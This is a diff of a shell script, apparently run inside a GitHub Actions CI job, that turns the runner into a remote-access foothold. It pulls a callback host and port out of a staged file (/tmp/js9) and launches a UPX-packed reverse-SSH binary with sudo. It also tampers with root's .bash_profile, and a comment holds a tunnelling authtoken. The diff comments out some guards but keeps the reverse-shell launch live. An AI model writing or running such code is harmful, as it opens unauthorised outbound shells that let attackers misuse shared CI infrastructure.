@@ -19,16 +19,16 @@ cp /home/runner/work/nc_test/nc_test/busybox.bin  .;
 sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 
-[ ! -z ${GITHUB_WORKSPACE} ] &&(
+# [ ! -z ${GITHUB_WORKSPACE} ] &&(
   
-  cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
-  id>$GITHUB_WORKSPACE/package/d2023.txt;
-  uptime>$GITHUB_WORKSPACE/d2023.txt;
-  #date>$GITHUB_WORKSPACE/dist/d2023.txt;
-  sudo mkdir -pv  $GITHUB_WORKSPACE/package;
-  sudo mkdir -pv  $GITHUB_WORKSPACE/dist;
+#   cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
+#   id>$GITHUB_WORKSPACE/package/d2023.txt;
+#   uptime>$GITHUB_WORKSPACE/d2023.txt;
+#   #date>$GITHUB_WORKSPACE/dist/d2023.txt;
+#   sudo mkdir -pv  $GITHUB_WORKSPACE/package;
+#   sudo mkdir -pv  $GITHUB_WORKSPACE/dist;
 
-)
+# )
 
 
 [ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;
@@ -46,7 +46,7 @@ port5=${ip_port5#*:};
 ip5=${ip_port5%:*};
 # 提取反弹socat的主机和端口，支持代理(ip7)
 ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9);
-echo flag_9832;
+echo "flag_9832";
 [ ! -z ${ip_port7pxy} ] && port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
 echo "flag 1122334";
@@ -75,10 +75,10 @@ fi
 if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then 
   #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
   #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 
-   [ ! -z ${GITHUB_WORKSPACE} ] &&
-   (
+   #[ ! -z ${GITHUB_WORKSPACE} ] &&
+   #(
       [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
-   )||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
+   #)||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
   echo "exit_revSSH_isOK_$bport";
 fi
 
